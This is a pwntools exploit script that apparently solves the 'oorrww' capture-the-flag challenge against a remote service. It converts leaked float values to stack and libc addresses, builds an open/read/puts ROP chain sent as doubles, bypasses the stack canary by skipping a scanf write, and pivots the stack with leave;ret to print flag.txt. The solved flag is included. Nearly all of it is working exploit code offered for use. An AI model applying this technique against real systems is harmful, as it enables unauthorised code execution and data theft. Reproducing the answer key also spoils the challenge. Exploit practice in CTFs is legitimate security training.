from pwn import *
# fill in binary name
elf = context.binary = ELF("./oorrww")
context.arch = 'amd64'
# fill in libc name
libc = ELF("./libc.so.6")

if args.REMOTE: 
  # fill in remote address
  p = remote("193.148.168.30", 7666)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = elf.process(env = {"LD_PRELOAD": libc.path})

# create exploit here
'''
Leaked stack address and libc address
Full RELRO, canary present, NX enabled, PIE enabled
We are able to overwrite RBP and RSP
Rewrite stack with "flag.txt", followed by ROP chain
ROP chain in stack still works against NX enabled!
'''
def float_to_long(f):
    # pack the float as little endian using <d
    # unpack into 8 bytes as little endian using <Q
    return struct.unpack('<Q', struct.pack('<d', f))[0]

def long_to_float(l):
  return str(struct.unpack('<d', struct.pack('<Q', l))[0]).encode()

p.recvuntil(b': ')
addresses = p.recvuntil(b'!\n')[:-2].decode()
local_a8_addr, scanf_addr = addresses.split()
local_a8_addr = float_to_long(float(local_a8_addr))
scanf_addr = float_to_long(float(scanf_addr))
print("local_a8 addr: " + hex(local_a8_addr))
print("scanf addr: " + hex(scanf_addr))
print("libc addr: " + hex(scanf_addr - libc.sym['__isoc99_scanf']))
libc.address = scanf_addr - libc.sym['__isoc99_scanf']

payload = str(struct.unpack('<d', struct.pack('<8s', b'flag.txt'))[0]).encode()
# we can only send 22 * 8 bytes!
info(payload)
# pause()
p.sendlineafter(b'\n', payload) # i = 0
p.sendlineafter(b'\n', long_to_float(0)) # i = 1
# syscall format: return val : rax, args: rdi, rsi, rdx
# ROP chain starts here
# open(local_a8_addr, 0, 0)
p.sendlineafter(b'\n', long_to_float(0x00000000000d8380 + libc.address)) # mov rax, 2 ; ret i = 2
p.sendlineafter(b'\n', long_to_float(0x000000000002a3e5 + libc.address)) # pop rdi; ret i = 3
# rdx is already 0
p.sendlineafter(b'\n', long_to_float(local_a8_addr)) # i = 4
p.sendlineafter(b'\n', long_to_float(0x000000000002be51 + libc.address)) # pop rsi; ret i = 5
p.sendlineafter(b'\n', long_to_float(0)) # i = 6
''' 
ROPgadget can't tell us which syscall gadget is followed by ret. Instead, use `Ropper.py --file libc.so.6 --search "syscall; ret"`
'''
p.sendlineafter(b'\n', long_to_float(0x0000000000091316 + libc.address)) # syscall ; ret i = 7

# read(3, local_a8_addr, 20) , assume the file descriptor is 3
p.sendlineafter(b'\n', long_to_float(0x000000000002a3e5 + libc.address)) # pop rdi ; ret i = 8
p.sendlineafter(b'\n', long_to_float(3)) # i = 9
p.sendlineafter(b'\n', long_to_float(0x000000000002be51 + libc.address)) # pop rsi; ret i = 10
# use local_a8_addr - 0x80 since we don't want any overlaps with our used stack space
p.sendlineafter(b'\n', long_to_float(local_a8_addr - 0x100)) # i = 11
p.sendlineafter(b'\n', long_to_float(0x000000000011f2e7 + libc.address)) # pop rdx ; pop r12 ; ret i = 12
p.sendlineafter(b'\n', long_to_float(50)) # i = 13
p.sendlineafter(b'\n', long_to_float(0)) # i = 14
p.sendlineafter(b'\n', long_to_float(libc.sym['read']))

# puts(local_a8_addr)
p.sendlineafter(b'\n', long_to_float(0x000000000002a3e5 + libc.address)) # pop rdi; ret i = 16
p.sendlineafter(b'\n', long_to_float(local_a8_addr - 0x100)) # i = 17
p.sendlineafter(b'\n', long_to_float(libc.sym['puts'])) # i = 18

# canary bypass
p.sendlineafter(b'\n', b'-') # i = 19

# overwrite RBP to local_a8 + 8
p.sendlineafter(b'\n', long_to_float(local_a8_addr + 8)) # i = 20

# stack pivoting
p.sendlineafter(b'\n', long_to_float(0x000000000004da83 + libc.address)) # leave ; ret i = 21

info(b"flag: " + p.recv(50))
# flag: L3AK{th3_d0ubl3d_1nput_r3turns_whAt_u_wAnt}